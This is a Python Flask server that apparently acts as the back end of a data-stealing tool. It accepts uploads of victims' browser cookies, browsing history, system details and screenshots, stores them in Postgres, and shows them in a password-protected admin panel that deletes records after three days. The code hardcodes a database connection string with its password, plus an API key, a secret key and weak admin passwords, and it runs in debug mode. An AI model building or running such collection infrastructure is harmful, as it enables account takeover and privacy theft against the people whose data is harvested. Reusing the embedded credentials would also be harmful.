import os
import json
import base64
import logging
from datetime import datetime, timedelta, timezone
from flask import Flask, request, render_template, abort, jsonify, Response
from flask_cors import CORS
from flask_httpauth import HTTPBasicAuth
import psycopg
from psycopg.rows import dict_row
from PIL import Image
import io

# --- Logging ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Flask setup ---
app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})
app.secret_key = os.getenv(
    "SECRET_KEY",
    "c1e4b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2"
)
auth = HTTPBasicAuth()

# --- Config ---
ADMINS = {
    os.getenv("ADMIN_USER1", "angel0chek"): os.getenv("ADMIN_PASS1", "angel0chek"),
    os.getenv("ADMIN_USER2", "winter"): os.getenv("ADMIN_PASS2", "winter")
}
UPLOAD_API_KEY = os.getenv("UPLOAD_API_KEY", "d3b07384d113edec49eaa6238ad5ff00")
DATABASE_URL = os.getenv(
    "DATABASE_URL",
    "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require"
)

if not DATABASE_URL:
    logger.error("DATABASE_URL environment variable is not set!")
    raise RuntimeError("DATABASE_URL must be set in env")

# --- Auth ---
@auth.verify_password
def verify(username, password):
    if ADMINS.get(username) == password:
        return username
    logger.warning(f"Failed login attempt for user: {username}")
    return None

# --- Image compression ---
def compress_image(data: bytes, quality: int = 60) -> bytes:
    try:
        img = Image.open(io.BytesIO(data))
        if img.mode != "RGB":
            img = img.convert("RGB")
        output = io.BytesIO()
        img.save(output, format="JPEG", quality=quality, optimize=True)
        return output.getvalue()
    except Exception as e:
        logger.error(f"Image compression failed: {e}")
        return data

# --- Database helpers ---
def get_conn():
    try:
        logger.info(f"Connecting to DB: {DATABASE_URL}")
        return psycopg.connect(DATABASE_URL, row_factory=dict_row)
    except psycopg.OperationalError as e:
        logger.error(f"Database connection failed: {e}")
        raise

def init_db():
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    client_id TEXT UNIQUE,
                    username TEXT,
                    cookies JSONB,
                    history JSONB,
                    system_info JSONB,
                    screenshot BYTEA,
                    timestamp TIMESTAMPTZ
                );
                CREATE INDEX IF NOT EXISTS idx_timestamp ON users(timestamp);
            """)
            conn.commit()
            logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")

def cleanup_old_data(days: int = 3) -> int:
    try:
        with get_conn() as conn, conn.cursor() as cur:
            delete_before = datetime.now(timezone.utc) - timedelta(days=days)
            cur.execute("DELETE FROM users WHERE timestamp < %s", (delete_before,))
            conn.commit()
            logger.info(f"Deleted {cur.rowcount} old records")
            return cur.rowcount
    except Exception as e:
        logger.error(f"Cleanup failed: {e}")
        return 0

def insert_or_update_user(client_id, username, cookies, history, system_info, screenshot_bytes, timestamp):
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT id, timestamp FROM users WHERE client_id=%s", (client_id,))
            row = cur.fetchone()
            if row:
                if timestamp > row["timestamp"]:
                    cur.execute("""
                        UPDATE users SET
                            username=%s,
                            cookies=%s,
                            history=%s,
                            system_info=%s,
                            screenshot=%s,
                            timestamp=%s
                        WHERE client_id=%s
                        RETURNING id
                    """, (username, json.dumps(cookies), json.dumps(history), json.dumps(system_info), screenshot_bytes, timestamp, client_id))
                    return cur.fetchone()["id"]
                return row["id"]
            cur.execute("""
                INSERT INTO users (client_id, username, cookies, history, system_info, screenshot, timestamp)
                VALUES (%s,%s,%s,%s,%s,%s,%s) RETURNING id
            """, (client_id, username, json.dumps(cookies), json.dumps(history), json.dumps(system_info), screenshot_bytes, timestamp))
            return cur.fetchone()["id"]
    except Exception as e:
        logger.exception("Database insert/update failed")
        return None

# --- Initialize DB ---
init_db()

# --- Routes ---
@app.route('/')
@auth.login_required
def admin_panel():
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
            rows = cur.fetchall()
            users = [{"id": r["id"], "username": r["username"], "timestamp": r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else ""} for r in rows]
            return render_template('admin.html', users=users)
    except Exception as e:
        logger.error(f"Admin panel error: {e}")
        return "Internal Server Error", 500

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT id, username, timestamp, (screenshot IS NOT NULL) AS has_screenshot FROM users WHERE id=%s", (user_id,))
            row = cur.fetchone()
            if not row:
                abort(404)
            user_meta = {
                "id": row["id"],
                "username": row["username"],
                "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else "",
                "has_screenshot": row["has_screenshot"]
            }
            return render_template('user_detail.html', user=user_meta)
    except Exception as e:
        logger.error(f"View user error: {e}")
        return "Internal Server Error", 500

@app.route('/api/data/<int:user_id>')
@auth.login_required
def api_user_data(user_id):
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT cookies, history, system_info, timestamp FROM users WHERE id=%s", (user_id,))
            row = cur.fetchone()
            if not row:
                return jsonify({"error": "not found"}), 404
            return jsonify({
                "cookies": row["cookies"] or [],
                "history": row["history"] or [],
                "system_info": row["system_info"] or {},
                "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
            })
    except Exception as e:
        logger.error(f"API user data error: {e}")
        return jsonify({"error": "server error"}), 500

@app.route('/screenshot/<int:user_id>')
@auth.login_required
def screenshot(user_id):
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT screenshot FROM users WHERE id=%s", (user_id,))
            row = cur.fetchone()
            if not row or not row["screenshot"]:
                abort(404)
            return Response(row["screenshot"], mimetype="image/jpeg")
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return "Internal Server Error", 500

@app.route('/api/upload', methods=['POST'])
def api_upload():
    key = request.headers.get("X-API-KEY")
    if key != UPLOAD_API_KEY:
        return jsonify({"error": "unauthorized"}), 401
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "invalid json"}), 400

    screenshot_bytes = None
    if data.get("screenshot"):
        screenshot_bytes = compress_image(base64.b64decode(data["screenshot"]))

    timestamp = datetime.now(timezone.utc)
    new_id = insert_or_update_user(
        client_id=data.get("clientId", "unknown"),
        username=data.get("username", "unknown"),
        cookies=data.get("cookies", []),
        history=data.get("history", []),
        system_info=data.get("systemInfo", {}),
        screenshot_bytes=screenshot_bytes,
        timestamp=timestamp
    )
    if new_id is None:
        return jsonify({"error": "db insert failed"}), 500
    return jsonify({"status": "ok", "id": new_id})

@app.route('/api/cleanup', methods=['POST'])
@auth.login_required
def api_cleanup():
    count = cleanup_old_data()
    return jsonify({"status": "success", "deleted": count})

@app.route('/health')
def health_check():
    try:
        with get_conn() as conn, conn.cursor() as cur:
            cur.execute("SELECT 1")
            row = cur.fetchone()
            if row and row.get(0) == 1:
                return jsonify({"status": "ok", "database": "connected"})
        return jsonify({"status": "error", "database": "unavailable"}), 500
    except Exception as e:
        return jsonify({"status": "error", "detail": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
